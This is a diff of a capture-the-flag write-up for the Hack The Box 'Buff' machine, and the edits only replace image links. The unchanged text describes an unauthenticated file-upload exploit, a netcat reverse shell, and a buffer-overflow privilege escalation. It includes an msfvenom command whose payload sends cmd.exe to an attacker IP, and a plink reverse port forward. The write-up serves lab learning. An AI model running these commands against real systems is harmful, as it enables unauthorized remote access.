@@ -84,7 +84,7 @@ Nmap done: 1 IP address (1 host up) scanned in 53.93 seconds
 
 After this I started enumerating different pages and source code for anything juicy and on Contacts page I saw this...
 
-![](https://i.imgur.com/tEDnnxW.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748511/img/tEDnnxW.png)
 
 I looked it up on searchsploit for potential matches and I got multiple...
 
@@ -114,11 +114,11 @@ Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vu
 
 This exploit uses upload.php present on the web server to upload a malicious PHP file, to bypass extension allow listing it adds a double extension at the end of file name, to bypass file type check it modifies 'Content-Type' headers in the POST request to 'image/png'. In the 'file' parameter of the POST request it inserts a PHP 'shell_exec' payload to achieve code execution.
 
-![](https://i.imgur.com/cI1jHHu.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748403/img/cI1jHHu.png)
 
 At this point I tried to curl reverse shells but they were being removed constantly (antivirus?), finally netcat 64 bit worked!
 
-![](https://i.imgur.com/byWRlju.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748433/img/byWRlju.png)
 
 In HTB windows boxes the user flag is placed in Desktop of the user, I checked the Desktop of shaun and got user flag!
 
@@ -126,7 +126,7 @@ In HTB windows boxes the user flag is placed in Desktop of the user, I checked t
 
 After some enumeration I found a setup file in Downloads directory...
 
-![](https://i.imgur.com/T6GjXBO.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748512/img/T6GjXBO.png)
 
 so I checked the running process using tasklist command to see if this application was running and it was! The filename of the setup file gives away the version of this application so that makes things a bit easier for finding an exploit...
 
@@ -165,11 +165,11 @@ The exploit is written in python and python was not installed on the machine, to
 msfvenom -p windows/exec CMD="C:\\xampp\\htdocs\\gym\\upload\\twh.exe 10.10.14.55 5555 -e cmd.exe" -b '\x00\x0A\x0D' -f python -v payload
 ```
 
-![](https://i.imgur.com/sgPSe3k.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748442/img/sgPSe3k.png)
 
 I replaced the shellcode in exploit script with the fresh one I generated with my ip and port...
 
-![](https://i.imgur.com/46z9ZaM.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748451/img/46z9ZaM.png)
 
 Now I downloaded plink.exe using curl and started another netcat listening on port 5555 and launched exploit using the current netcat connection...
 
@@ -181,8 +181,8 @@ plink.exe -l twh -R 8888:127.0.0.1:8888 10.10.14.55 "python /home/twh/htb/buff/c
       Forward remote port to local address
 ```
 
-![](https://i.imgur.com/pk8uibU.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748459/img/pk8uibU.png)
 
 Got Root!
 
-![](https://i.imgur.com/u16DlHz.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748505/img/u16DlHz.png)
